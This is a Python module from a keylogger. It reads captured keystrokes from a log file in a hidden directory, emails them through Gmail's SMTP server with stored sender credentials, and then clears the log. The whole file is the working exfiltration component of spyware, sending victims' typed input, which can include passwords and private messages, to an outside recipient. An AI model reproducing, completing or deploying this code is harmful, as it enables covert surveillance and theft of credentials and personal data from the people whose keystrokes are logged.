from smtplib import SMTP
from ssl import create_default_context
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from constants import *
from utils import get_time
from os.path import join
from playsound import playsound


def send_mail() -> None:
    """
    Send keylogger data through Gmail.
    """
    log_f = open(join(HIDE_DIR, LOG_FILE), "r+", encoding="utf-8")

    try:
        # Initialize and login gmail server
        server = SMTP(host="smtp.gmail.com", port=587)
        server.ehlo()
        server.starttls(context=create_default_context())
        server.ehlo()
        server.login(user=SENDER, password=SMTP_PASSWORD)

        # Get data from log file
        body = log_f.read().strip()
        
        # New line in HTML
        body = body.replace("\n", "<br>")
        # Avoid losing spaces
        body = body.replace(" ", "&nbsp;")

        # Change font size and font face
        body = f'<font size="{FONT_SZ}" face="{FONT_FACE}">{body}</font>'

        # Initialize message
        message = MIMEMultipart()
        message["Subject"] = f"Keylogger {get_time(day=True)}"
        message["From"] = SENDER
        message["To"] = RECIPIENT
        message.attach(MIMEText(body, "html", "utf-8"))

        # Send message
        server.send_message(message)
        server.quit()

        # After sending the mail successfully, delete all data in the log file
        log_f.truncate(0)
        log_f.close()

    # Play a sound if exists any error
    except:
        playsound(FAIL_SOUND)


if __name__ == "__main__":
    send_mail()
